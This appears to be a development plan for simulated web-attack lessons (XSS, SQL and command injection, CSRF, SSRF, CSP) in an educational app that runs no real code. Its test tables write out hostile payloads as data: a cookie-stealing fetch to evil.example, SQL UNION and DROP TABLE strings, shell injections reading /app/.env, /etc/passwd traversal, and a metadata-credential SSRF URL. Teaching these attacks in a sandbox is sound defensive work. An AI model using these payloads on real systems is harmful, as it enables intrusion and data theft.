# Security Track, Phase 3 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Finish the Security track with 8 Web Attacks & Defenses lessons on the phase 2 simulated web app, where typed payloads behave for real and no real code ever runs.

**Architecture:** Three small parsers (`html`, `pageScript`, `shell`) with no execution of real code. The browser gains subresource rules, `fetchFrom` and `csp`, and `page.ts` loads a page and runs its allowed scripts. The shop gains one option per lesson. Each lesson's scenario builds a world, plays the moves and returns steps through a `story`, as in phase 2.

**Tech Stack:** TypeScript 7 (strict, `noUncheckedIndexedAccess`), React 19, Vite 8, Vitest 5, Oxlint. Node 24.

**Spec:** `docs/superpowers/specs/2026-10-30-security-track-phase-3-design.md`

## Global Constraints

- Branch `security-phase-3` (the spec is committed). No worktrees.
- `src/security/` contains no React; all lesson text lives in `src/lessons/`.
- **No real code runs:** no `eval`, `new Function`, `.innerHTML =`, iframe or `fetch` of a typed value. Typed text reaches the screen only as text.
- A typed URL can only reach simulated sites. Any other host gives a recorded network error.
- Deterministic: nothing reads the clock or `Math.random`. Entry points never throw. Bad knobs give one step through `refusal`. A typed payload that fails to parse is a normal run, not a refusal.
- Results come from what the app really did, never from matching the payload's text.
- `MAX_STEPS = 200` per run. Code lines via `lineOf`. Byte grids stay at 6 columns. Views must fit a 341 px stage.
- `input` fields: 1 to 120 bytes through `readBytes`.
- Lessons: no `complexity`, `codeLabel: 'Pseudocode'`, 4 quiz questions of at least 3 types, at least one `predict-next` whose view comes from a real step and does not reveal the answer. Copy is plain, short sentences with actual values, and uses no pronouns for Alice, Bob, Carol, Eve or Mallory.
- The last paragraph of each lesson's `concept` says what production systems use instead and contains the word "production".
- Lessons register in curriculum order. Each lesson task appends its meta (difficulty `advanced`, group `Web Attacks & Defenses`), appends its id to `EXPECTED_IDS` in `lessons.test.ts`, and bumps the lesson count in `scripts/static-pages.test.ts`.
- Every step's text must be true for every reachable setting, including benign input. Check quiz answers against the run, and claims about browsers against what all current browsers do.
- Commit messages, PR titles and PR bodies contain no AI attribution.
- Every task ends green on `npm run typecheck`, `npm run lint` and `npm test`, read from their exit codes, before its commit.

## Rulings (where this plan narrows the spec)

- **`loadPage` lives in `page.ts` as `loadPage(world, url, initiator?)`**, not on `Browser`, so the browser stays free of the parsers.
- **`console.log(value)` joins the page language.** A page's own nonce-carrying script needs a harmless statement to run.
- **`Browser.subresource(url, initiator)`** is the `<img>` request: GET, no `origin` header, `SameSite=None` cookies only.
- **Internal hosts answer only `from: 'shop'`.** `world.send` gives a network error for any other party, so a typed URL in a browser can't reach them.
- **`images.example` is its own site,** `createImages()`, with party `images`.
- **`comments` is a new table** (`id`, `author`, `body`). `POST /comments` needs a session.
- **CSRF token:** `GET /order-form` returns a token tied to the session. `SAFE_SHOP.csrf` is `token`.
- **`GET /welcome` runs through `page.ts`** with sink `inner`, using the URL's `#` fragment, which is never sent to the server.
- **`SAFE_SHOP.cookie` gains `sameSite: 'Lax'`**, and the phase 2 hard-coded flag goes. The `applies the cookie flags` test gets `sameSite: 'Lax'`.
- **`/download` does not use the shell.** Traversal is a path bug, and the shell belongs to `/ping`.
- **A typed run's `result`:** `attacker in` when the app did something the input should not have caused, `stopped` when the input stayed data, including benign input.

## Review Focus

- **Benign input** (`lamp`, `8.8.8.8`, `invoice.txt`, `https://images.example/cat.png`, `hello`): works normally under every defense, and no step says an attack happened. Pinned in Tasks 9–13.
- **A typed `<img src=x onerror=alert(1)>` in the real page:** it renders as escaped text and fires no real dialog. Pinned in Task 11 through `renderToString`, in a test beside the renderers, since `src/security/` has no React.
- **Unfinished markup:** `<script>alert(1)` with no closing tag does not run, and `<img src=x onerror=alert(1)` with no `>` makes no tag, as in real browsers. Pinned in Task 2.
- **Mixed case and encoded input:** `<ScRiPt>` runs, `%2e%2e%2f` traverses, and `....//` beats the strip-once filter. Pinned in Tasks 2 and 10.
- **SQL errors from typed quotes:** `'` and `' UNION SELECT 1 --` give a 500 page showing the interpreter's message, and nothing throws. Pinned in Task 9.

## File map

| File | Responsibility |
|---|---|
| `src/security/web/html.ts`, `pageScript.ts`, `shell.ts` | The three parsers |
| `src/security/web/csp.ts`, `page.ts` | Policy checks; loading a page and running its scripts |
| `src/security/web/browser.ts`, `http.ts`, `site.ts`, `world.ts`, `db.ts` | Extended |
| `src/security/web/shop.ts`, `evil.ts`, `story.ts` | Extended |
| `src/security/web/shop-pages.ts`, `shop-cors.ts` | Comment, search and order routes; CORS headers |
| `src/security/web/internal.ts` | `createInternal()`, `createImages()` |
| `src/security/scenarios/<id>.ts`, `src/lessons/security/<id>.ts` | Each lesson |

---

### Task 1: Browser fixes and subresources

**Files:** Modify `src/security/web/browser.ts`, `browser.test.ts`, `http.ts`.

**Interfaces:**
- Produces: `WebRequest.method` adds `'PUT' | 'OPTIONS'`. `cookiesFor(url, initiator?, method?, subresource = false)`. `subresource(url, initiator): WebResponse`.
- Produces: `submit` sends `origin: originOf(initiator ?? url)` in its headers.

- [ ] **Step 1: Write the failing tests.** Add to the cookie table:
  - `Lax` on a cross-site GET subresource: not sent. No `SameSite` on one: not sent. `None` with `secure` on one: sent. `Strict` same-site subresource: sent.
  - Path `/admin` matches `/admin` and `/admin/x`, and not `/administrator`.
  - A `Secure` cookie set from `http:` is rejected. An `http:` cookie can't replace a `Secure` one.
  - `submit` sends an `origin` header naming the initiator. `subresource` sends none and sends no cookie across sites unless `None`.
- [ ] **Step 2: Run them.** `npx vitest run src/security/web/browser`. Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: subresource cookie rules and two browser fixes`

### Task 2: HTML tokenizer

**Files:** Create `src/security/web/html.ts`, `html.test.ts`.

**Interfaces:**
- Produces: `Tag = { name: string; attributes: Record<string, string>; text: string }`; `parseHtml(text: string): Tag[]`; `escapeHtml(text: string): string` (`&`, `<`, `>`, `"`, `'`); `FoundScript = { source: string; kind: 'inline' | 'external' | 'handler' | 'waits'; nonce?: string }`; `findScripts(html: string, sink: 'page' | 'inner'): FoundScript[]`.

- [ ] **Step 1: Write the failing tests, as one table** of `(html, sink) → scripts`:
  - `<script>alert(1)</script>` under `page` is inline, under `inner` is nothing. `<ScRiPt>` runs. A `nonce` attribute is kept.
  - `<script src=https://evil.example/x.js></script>` is external under `page`.
  - `<img src=x onerror=alert(1)>`, `<svg onload="alert(1)">`, `<body onload='alert(1)'>` are handlers under both sinks.
  - `<a onclick=alert(1)>` and `<a href="javascript:alert(1)">` are `waits`.
  - `<script>alert(1)` with no closing tag finds nothing. `<img src=x onerror=alert(1)` with no `>` makes no tag.
  - `escapeHtml('<a href="x">\'&')` is `&lt;a href=&quot;x&quot;&gt;&#39;&amp;`, and `findScripts` of any escaped payload finds nothing.
  - Plain text, an empty string and `<<<` give no scripts and do not throw.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement** with one pass over the text, not nested regular expressions.
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: an HTML tokenizer that runs nothing`

### Task 3: The page language

**Files:** Create `src/security/web/pageScript.ts`, `pageScript.test.ts`.

**Interfaces:**
- Consumes: `Browser`.
- Produces: `Statement`, a union of `alert`, `log`, `fetch`, `navigate`, `image`, each with a `Value`; `Value = ({ text: string } | { read: 'cookie' | 'href' })[]`; `parsePageScript(text: string): { ok: true; statements: Statement[] } | { ok: false; why: string }`; `runPageScript(statements: Statement[], origin: string, browser: Browser, href: string): string[]`, returning one plain line per action, such as `alert("1")` or `sent a request to https://evil.example/c?sid=1`.

- [ ] **Step 1: Write the failing tests.**
  - Each form parses: `alert(1)`, `alert('x')`, `console.log('x')`, `fetch('https://evil.example/c?' + document.cookie)`, `location = 'https://evil.example'`, `location.href = 'x'`, `document.location = 'x'`, `new Image().src = 'x' + document.cookie`, and two joined by `;`.
  - `eval('x')`, `window.alert(1)`, `alert(`, and an empty string give `{ ok: false }`, and `why` names what the simulation understands.
  - `document.cookie` reads through `runScript`, so an `HttpOnly` cookie gives empty text.
  - `fetch` reaches a simulated site as `fetchFrom` with no credentials, `new Image().src` calls `subresource`, and a host that doesn't exist gives a recorded network error.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.** Until Task 5 adds it, `fetch` calls `browser.subresource`.
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: a small page language with a fixed set of statements`

### Task 4: The fake shell

**Files:** Create `src/security/web/shell.ts`, `shell.test.ts`.

**Interfaces:**
- Produces: `FILES: Record<string, string>` (`/var/www/files/invoice.txt`, `/var/www/files/manual.txt`, `/etc/passwd`, `/app/.env` holding `DB_PASSWORD=fake-password`); `FILES_ROOT = '/var/www/files'`; `ShellRun = { commands: string[]; output: string }`; `runShell(line: string): ShellRun`; `resolvePath(base: string, path: string): string`.

- [ ] **Step 1: Write the failing tests.**
  - `ping -c 1 8.8.8.8` runs one command. `ping -c 1 8.8.8.8; cat /app/.env` runs two and prints the file.
  - `&&` stops after a failed command. `|` passes output on, so `cat /etc/passwd | wc` is `command not found` for `wc` and still lists both commands.
  - `$(whoami)` is replaced by its output. Nesting 3 deep works. A fourth level stays as plain text.
  - Unknown commands give `command not found`. An unclosed `$(` or quote does not throw.
  - `resolvePath('/var/www/files', '../../etc/passwd')` is `/etc/passwd`. `..` past the root stays at `/`. `.` is dropped.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: a fake shell over a fake filesystem`

### Task 5: Same-origin, CORS, CSP and page loading

**Files:** Create `src/security/web/csp.ts`, `csp.test.ts`, `page.ts`, `page.test.ts`. Modify `browser.ts`, `browser.test.ts`, `pageScript.ts`.

**Interfaces:**
- Consumes: Tasks 1–3.
- Produces, in `browser.ts`: `FetchResult = { sent: boolean; status: number; readable: boolean; body: string | null; blockedBy?: string }`; `fetchFrom(origin: string, url: string, options?: { method?: 'GET' | 'PUT'; credentials?: boolean; headers?: Record<string, string> }): FetchResult`.
- Produces, in `csp.ts`: `allowsScript(policy: string | undefined, script: FoundScript, pageOrigin: string, url?: string): { allowed: boolean; rule?: string }`. `rule` is the directive that blocked it.
- Produces, in `page.ts`: `ScriptRun = { source: string; status: 'ran' | 'blocked' | 'not understood' | 'waits for a click'; rule?: string; actions: string[] }`; `PageRun = { response: WebResponse; scripts: ScriptRun[] }`; `loadPage(world: World, url: string, initiator?: string): PageRun`; `loadInner(world: World, pageUrl: string, html: string): PageRun`.

- [ ] **Step 1: Write the failing tests.**
  - `fetchFrom`, as a table of `(allow headers, credentials, method) → sent, readable, blockedBy`: same-origin is always readable. Cross-origin with no header: sent, status 200, not readable. Exact origin with `allow-credentials`: readable. `*` without credentials: readable. `*` with credentials: not readable. Exact origin with credentials and no `allow-credentials`: not readable. `PUT` with a failed preflight: `sent` false and no `PUT` in `world.events`. `PUT` with a passing preflight: sent.
  - `credentials: false` sends no cookies. `credentials: true` sends only `SameSite=None` cookies across sites.
  - `allowsScript`, as a table: no policy allows all. `script-src 'self' 'unsafe-inline'` allows inline and handlers, and blocks an evil host. `script-src 'nonce-abc'` allows only `nonce="abc"`, and blocks handlers and outside scripts. `default-src 'self'` applies with no `script-src`. `https://evil.example` as a source allows that host.
  - `loadPage` runs an allowed script, reports a blocked one with its rule, reports `not understood` for `eval(1)`, and fetches an external script from its simulated site.
  - `loadInner` leaves `<script>` inert and runs `onerror`.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.** Move `pageScript`'s `fetch` to `fetchFrom`.
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: same-origin, CORS, CSP and page loading`

### Task 6: Injection routes

**Files:** Modify `src/security/web/db.ts`, `db.test.ts`, `shop.ts`, `shop.test.ts`.

**Interfaces:**
- Produces: `ShopDb.execute(sql: string): { ok: boolean; rows: Row[]; error?: string }`, which keeps writes.
- Produces in `ShopOptions`: `queries: 'string' | 'blocklist' | 'parameters'`; `commands: 'shell' | 'blocklist' | 'noShell'`. `SAFE_SHOP` has `parameters` and `noShell`.
- Produces routes: `GET /search?q=` (`SELECT item, total, owner FROM orders WHERE item LIKE '%q%'`, 500 with the error text on failure), `GET /ping?host=`, `GET /download?file=`. `blockedInput(text: string): boolean` for the SQL blocklist (exact `OR`, `UNION`, `--`).
- `POST /signin` with `queries` other than `parameters` puts the name and hash in one statement, `SELECT * FROM users WHERE name = '...' AND hash = '...'`. It uses unsalted `storage: 'sha256'`.

- [ ] **Step 1: Write the failing tests,** with the probed values:
  - `alice' --` signs in with a wrong password under `string`. `' or 1=1 or '` signs in as the first row under `string` and `blocklist`.
  - `' UNION SELECT name, hash, role FROM users --` returns user rows under `string`, and is refused under `blocklist`.
  - `' union select name, hash, role from users where name like '` returns user rows under `blocklist`.
  - `'; DROP TABLE orders --` removes the table under `string`.
  - Every payload above is plain text under `parameters`: no rows, or no sign-in, and the tables stay.
  - `'` and `' UNION SELECT 1 --` give a 500 whose body holds the interpreter's message. `lamp` finds order 101 in every mode.
  - `/ping`: `8.8.8.8; cat /app/.env` prints the file under `shell`, is refused under `blocklist`, and `8.8.8.8 | cat /app/.env` is not. Under `noShell`, both give 400 and `8.8.8.8` gives 200.
  - `/download`: `../../etc/passwd` and `%2e%2e%2f%2e%2e%2fetc/passwd` leave the folder under `shell`. `blocklist` strips `../` once, so the plain form fails and `....//....//etc/passwd` works. `noShell` refuses all, and `invoice.txt` works in every mode.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.** `/ping` runs `ping -c 1 ${host}` through `runShell`, and `noShell` checks `/^[a-z0-9.-]+$/i` and calls it with no shell parsing.
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: injection routes on the shop`

### Task 7: Page, CORS, CSRF and SSRF routes

**Files:** Create `src/security/web/shop-pages.ts`, `shop-cors.ts`, `internal.ts`, `pages.test.ts`. Modify `shop.ts`, `shop.test.ts`, `db.ts`, `site.ts`, `world.ts`, `world.test.ts`, `evil.ts`, `story.ts`, `story.test.ts`.

**Interfaces:**
- Consumes: Tasks 1, 5, 6.
- Produces in `ShopOptions`: `encode: boolean`; `csp: 'none' | 'unsafeInline' | 'nonce'`; `cookie.sameSite`; `cors: 'none' | 'one' | 'reflect' | 'wildcard'`; `csrf: 'none' | 'token' | 'origin'`; `preview: 'open' | 'blocklist' | 'allowList'`; `egress: boolean`. `SAFE_SHOP`: `true`, `nonce`, `Lax`, `none`, `token`, `allowList`, `true`.
- Produces: `Site.hosts?: string[]`; `Party` and `NodeId` add `internal` and `images`; links shop–internal and shop–images. `INTERNAL_HOSTS = ['metadata.internal', '169.254.169.254', 'admin.internal']`; `createInternal(): Site`; `createImages(): Site`; `APP_ORIGIN = 'https://app.shop.example'`.
- Produces routes: `GET /comments`, `POST /comments`, `GET /welcome`, `GET /order-form`, `POST /orders`, `GET /orders/new?item=`, `OPTIONS /account`, `PUT /account`, `GET /preview?url=`, `POST /admin/export?to=`. On evil: `GET /c`, `GET /go`, `GET /x.js`, `POST /drop`; `evilStolen(world): string[]` (queries of `/c`).
- Constants: `/preview` follows at most 3 redirects unless `allowList`, which allows host `images.example` only and follows none. `egress` allows host `backup.shop.example` only.

- [ ] **Step 1: Write the failing tests.**
  - `encode` off puts `<b>` into `/search` and `/comments` bodies, and on gives `&lt;b&gt;`. A stored comment reaches another user's page.
  - `csp` sets the header on every page with a fresh nonce per page, and the page's own script carries it.
  - `cors`: each value gives the right headers on `GET` and `OPTIONS /account`, with `reflect` echoing any `origin`.
  - `csrf`, as a table of attack × setting, with `SameSite=None` cookies: `none` accepts both. `token` refuses a missing or wrong token on both, and accepts the one from `/order-form`. `origin` refuses `POST` from `evil.example`, accepts it from the shop, and accepts the `GET`, which has no `origin` header.
  - `/preview`, as a table of url × setting: `http://169.254.169.254/latest/credentials` is open under `open`, refused under `blocklist`. `http://metadata.internal/latest/credentials` passes `blocklist`. `https://evil.example/go` reaches metadata under `open` and `blocklist`. Under `allowList` all three give 403, and `https://images.example/cat.png` works in every mode. `https://real-site.com/` gives 502.
  - A browser or attacker request to an internal host gets a network error.
  - `/admin/export` sends the users table to `evil.example/drop` with `egress` off, and 403 with it on.
- [ ] **Step 2: Run them.** Expected: FAIL.
- [ ] **Step 3: Implement.** Route tables stay in `shop.ts`; handlers go in `shop-pages.ts` to keep it readable.
- [ ] **Step 4: Run them.** Expected: PASS.
- [ ] **Step 5: Commit.** `Security: page, CORS, CSRF and SSRF routes`

### Tasks 8–15: one lesson each

Each task creates `src/security/scenarios/<id>.ts`, `<id>.test.ts` and `src/lessons/security/<id>.ts`, and modifies `src/lessons/meta/security.ts`, `lessons.test.ts` and `scripts/static-pages.test.ts`.

Steps for each:

- [ ] **Step 1: Write the failing scenario test** with the assertions below.
- [ ] **Step 2: Run it.** `npx vitest run src/security/scenarios/<id>.test.ts`. Expected: FAIL.
- [ ] **Step 3: Implement the scenario:** `<camelId>Code`, the option arrays, `<camelId>Steps(values)`.
- [ ] **Step 4: Write the lesson and meta** per the Global Constraints, with one preset per attack, starting with the attack working.
- [ ] **Step 5: Run everything.** `npm run typecheck && npm run lint && npm test`. Expected: all exit 0.
- [ ] **Step 6: Commit.** `Security: <lesson title> lesson`

| Task | Lesson (fields) | Scenario test assertions |
|---|---|---|
| 8 | Same-Origin & CORS (`attack`, `cors`) | Every run uses `cookie.sameSite: 'None'`. Both attacks across all four settings: `attacker in` only for Reflect any. Read my account: the response reaches the browser (status 200 in events) in every setting, and the step says the page can't read it where refused. Change my account: no `PUT` in events unless Reflect any. Wildcard names the credentials rule. |
| 9 | SQL Injection (`query`, `input`, `defense`) | The Task 6 payloads through the lesson, with `result` per defense. The final query appears in `rows` or a step, in full. `lamp`, and `alice` at Sign-in, give `stopped`, with no step claiming an attack. `'` shows the error as a page. The Parameters text says real drivers send values apart. The stacked step says many drivers refuse it. |
| 10 | Command Injection (`feature`, `input`, `defense`) | `8.8.8.8; cat /app/.env`, `8.8.8.8 \| cat /app/.env`, `8.8.8.8 $(whoami)`, `../../etc/passwd`, `%2e%2e%2f%2e%2e%2fetc/passwd`, `....//....//etc/passwd` with `result` per defense. The parsed commands, or the resolved path, appear as text. `8.8.8.8` and `invoice.txt` give `stopped` everywhere. |
| 11 | Cross-Site Scripting (`where`, `input`, `defense`) | Reflected and Stored run `<script>fetch('https://evil.example/c?' + document.cookie)</script>` with Off, and `evilStolen` holds the cookie. On gives `stopped`, with the payload shown as text. DOM: `<script>` is inert and `<img src=x onerror=alert(1)>` runs. An `HttpOnly` cookie gives empty text and the step says so. A payload outside the language says the simulation does not understand it, and is not `attacker in`. `hello` gives `stopped`. `src/components/visualization/renderers/typedText.test.tsx`: `renderToString` of a run with `<img src=x onerror=alert(1)>` holds `&lt;img` and no live tag. |
| 12 | Content Security Policy (`policy`, `input`) | Inline payload: None in, `unsafe-inline` in, Nonce stopped. `<script src=https://evil.example/x.js></script>`: None in, `unsafe-inline` stopped, Nonce stopped. `<img src=x onerror=...>`: stopped only by Nonce. Each refusal names `script-src`. The page's own script runs under all three. The last step says the markup is still in the page. |
| 13 | CSRF (`attack`, `defense`) | Every pair. Auto-submitted form: None in, SameSite stopped, Token stopped, Origin stopped. Image tag: None in, SameSite stopped, Token stopped, Origin in, and that step says the GET has no `origin` header and must not change state. `in` means a new row in `orders` for alice, shown in `rows`. |
| 14 | SSRF (`input`, `defense`) | The Task 7 table through the lesson, with `result` per defense. Credentials appear only when reached. `https://images.example/cat.png` gives `stopped` and shows the image text. `https://real-site.com/` gives a network error. The allow-list step says redirects are not followed. |
| 15 | Threat Modeling (`encoding`, `csp`, `httpOnly`, `roleCheck`, `egress`) | All 32 settings: the run stops at the first layer that is on, in that order. All off reaches stage `out`, with `result` `attacker in` and the users table at `evil.example`. Each run lists the later layers that would also have held. `variables.stage` is one of `comment`, `cookie`, `admin`, `export`, `out`. |

**Prerequisites (meta):** as in the spec's Lessons section.

**Contract:** Task 9 adds `HOSTILE` to `src/security/contract.test.ts`: unbalanced quotes, `<`, `<<<`, `$(`, `%`, `%zz`, `\\`, and a `$(` chain of 40. `valueFor` picks from it for `text` fields. Task 11 adds a source test in `src/security/web/noRealCode.test.ts`: no file in `src/security/web/` contains `eval(`, `new Function` or `.innerHTML =`, and the number of `dangerouslySetInnerHTML` uses in `src/components/` does not grow.

**Task 11 browser check:** at 375 px, type `<img src=x onerror=alert(1)>`, press Run, step through it, and confirm no real dialog opens and the text shows as text.

### Task 16: Docs and final checks

**Files:** Modify `README.md`, `CLAUDE.md`.

- [ ] **Step 1: Update the docs.** `CLAUDE.md`: extend `web/` with `html`, `pageScript`, `shell`, `csp`, `page`, `internal` and the rule that no real code runs. `README.md`: lesson count 178, Security (23 of 23 live) with the 8 titles, drop "Web attacks are coming", and add typed-payload lessons to "How to add a Security lesson".
- [ ] **Step 2: Run CI's checks.** `npm run lint && npm test && npm run build:pages && npm run check:bundle`. Expected: all exit 0, first load under 600 kB.
- [ ] **Step 3: Check by hand.** `npm run dev`, then at 375 px and 1024 px, in both themes: all 8 lessons open with no sideways scroll in the stage, each preset runs, and one payload typed by hand behaves. Confirm no real dialog ever opens.
- [ ] **Step 4: Commit.** `Docs: Security track phase 3`
